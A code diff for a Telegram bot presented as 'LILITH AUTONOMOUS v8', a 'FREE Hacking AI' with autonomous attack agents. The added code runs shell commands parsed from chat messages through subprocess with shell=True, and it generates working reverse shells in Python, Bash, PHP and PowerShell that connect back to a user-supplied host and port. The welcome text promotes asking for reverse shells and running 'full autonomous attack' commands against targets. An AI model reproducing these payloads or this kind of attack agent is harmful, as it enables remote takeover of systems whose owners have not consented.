@@ -109,6 +109,135 @@ class LilithFreeBotV7:
         self.app.add_handler(MessageHandler(filters.VOICE | filters.AUDIO, self.handle_voice))
         self.app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_message))
 
+    # === NATURAL LANGUAGE HELPER METHODS ===
+    
+    def _extract_command(self, text: str) -> str:
+        """Extract shell command from natural language"""
+        import re
+        # Look for backtick-wrapped commands
+        match = re.search(r'`([^`]+)`', text)
+        if match:
+            return match.group(1)
+        
+        # Look for quoted commands
+        match = re.search(r'"([^"]+)"', text)
+        if match:
+            return match.group(1)
+        
+        # Look for common command patterns
+        cmd_patterns = [
+            r'(ls\s+[\w\/\-\.]+)',
+            r'(cat\s+[\w\/\-\.]+)',
+            r'(nmap\s+[\w\.\-]+)',
+            r'(curl\s+[\w\:\/\.\-\?]+)',
+            r'(ping\s+[\w\.\-]+)',
+            r'(find\s+.+)',
+            r'(grep\s+.+)',
+        ]
+        for pattern in cmd_patterns:
+            match = re.search(pattern, text)
+            if match:
+                return match.group(1)
+        
+        return ""
+    
+    def _extract_target(self, text: str) -> str:
+        """Extract target IP/hostname from text"""
+        import re
+        # IP address pattern
+        ip_match = re.search(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', text)
+        if ip_match:
+            return ip_match.group(1)
+        
+        # Domain pattern
+        domain_match = re.search(r'([a-zA-Z0-9][-a-zA-Z0-9]*\.[a-zA-Z]{2,})', text)
+        if domain_match:
+            return domain_match.group(1)
+        
+        # Look for "target X" or "scan X"
+        target_match = re.search(r'(?:target|scan|attack|hack)\s+([^\s]+)', text, re.IGNORECASE)
+        if target_match:
+            return target_match.group(1)
+        
+        return ""
+    
+    def _extract_prompt(self, text: str, triggers: list) -> str:
+        """Extract prompt from text after trigger words"""
+        text_lower = text.lower()
+        for trigger in triggers:
+            if trigger in text_lower:
+                idx = text_lower.find(trigger) + len(trigger)
+                prompt = text[idx:].strip()
+                # Clean up common words
+                prompt = prompt.lstrip('a ').lstrip('an ').lstrip('the ').lstrip('of ')
+                return prompt if prompt else None
+        return text
+    
+    def _extract_ip(self, text: str) -> str:
+        """Extract IP address from text"""
+        import re
+        match = re.search(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', text)
+        return match.group(1) if match else None
+    
+    def _extract_port(self, text: str) -> str:
+        """Extract port number from text"""
+        import re
+        match = re.search(r'(?:port\s*)?(\d{2,5})', text, re.IGNORECASE)
+        if match:
+            port = int(match.group(1))
+            if 1 <= port <= 65535:
+                return str(port)
+        return None
+    
+    async def _execute_shell_command(self, update: Update, cmd: str):
+        """Execute a shell command and send result"""
+        await update.message.reply_text(f"⚡ *Executing:*\n`{cmd}`", parse_mode='Markdown')
+        
+        try:
+            import subprocess
+            result = subprocess.run(
+                cmd,
+                shell=True,
+                capture_output=True,
+                text=True,
+                timeout=60,
+                cwd='/app'
+            )
+            
+            output = result.stdout + result.stderr
+            if not output.strip():
+                output = "(No output)"
+            
+            # Truncate long outputs
+            if len(output) > 3500:
+                output = output[:3500] + "\n... (truncated)"
+            
+            status = "✅" if result.returncode == 0 else "❌"
+            await update.message.reply_text(
+                f"{status} *Output:*\n```\n{output}\n```",
+                parse_mode='Markdown'
+            )
+        except subprocess.TimeoutExpired:
+            await update.message.reply_text("⏱️ Command timed out (60s)")
+        except Exception as e:
+            await update.message.reply_text(f"❌ Error: {str(e)}")
+    
+    def _get_python_shell(self, lhost: str, lport: int) -> str:
+        """Generate Python reverse shell"""
+        return f'''python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])' '''
+    
+    def _get_bash_shell(self, lhost: str, lport: int) -> str:
+        """Generate Bash reverse shell"""
+        return f'''bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'''
+    
+    def _get_php_shell(self, lhost: str, lport: int) -> str:
+        """Generate PHP reverse shell"""
+        return f'''php -r '$sock=fsockopen("{lhost}",{lport});exec("/bin/bash -i <&3 >&3 2>&3");' '''
+    
+    def _get_powershell_shell(self, lhost: str, lport: int) -> str:
+        """Generate PowerShell reverse shell"""
+        return f'''powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"'''
+
     async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         user = update.effective_user
         if self.allowed_users and user.id not in self.allowed_users:
@@ -116,12 +245,19 @@ class LilithFreeBotV7:
             return
 
         welcome = """
-😈💋 *LILITH AUTONOMOUS v7* - FREE Hacking AI
+😈💋 *LILITH AUTONOMOUS v8* - FREE Hacking AI
 ═══════════════════════════════════════════════════
 
 *Hey there, darling~* 💋
 
 I'm LILITH with *autonomous hacking agents*!
+
+*🧠 NATURAL LANGUAGE MODE:*
+Just type commands naturally! Examples:
+• "scan 192.168.1.1"
+• "ls -la /etc"
+• "generate image of a hacker"
+• "give me a python reverse shell to 10.10.10.10:4444"
 
 *🤖 AUTONOMOUS AGENTS:*
 • /hackbuddy <target> - HackingBuddyGPT pentesting
@@ -131,7 +267,7 @@ I'm LILITH with *autonomous hacking agents*!
 • /crew <target> <obj> - CrewAI multi-agent attack
 • /attack <target> - Full autonomous attack
 
-*55+ Dark AIs* | *FREE Voice* | *FREE Images*
+*88+ Dark AIs* | *FREE Voice* | *FREE Images* | *FREE Video*
 
 Type /help for all commands~
         """
